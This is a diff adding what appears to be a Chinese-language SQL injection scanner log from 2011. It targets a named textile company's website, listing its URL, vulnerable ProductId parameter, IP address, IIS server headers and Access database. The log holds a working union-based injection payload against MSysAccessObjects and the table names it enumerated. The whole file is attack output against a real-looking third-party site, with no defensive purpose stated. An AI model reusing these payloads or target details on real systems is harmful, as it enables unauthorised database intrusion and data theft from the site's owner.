@@ -1,0 +1,29 @@
+■漏洞信息:============================================================
+ ·URL:http://www.qisaifd167.com/htm/cp_ny.asp?ProductId=99
+ ·页面标题：山东齐赛纺织集团公司
+ ·参数:ProductId=99
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:117.79.93.242
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Tue, 23 Aug 2011 10:51:16 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 14188
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDCQACSQCA=DIDFMFFBOELBDAFDDBGPNBEP; path=/
+Cache-control: private
+
+
+联合查询列数: 总共= 24  显示的列= 2
+联合查询SQL: and 3=8 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 from MSysAccessObjects
+找到表:news
+找到表:News
+联合查询列数: 总共= 24  显示的列= 2
+联合查询SQL: and 3=8 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 from MSysAccessObjects
+找到表:news
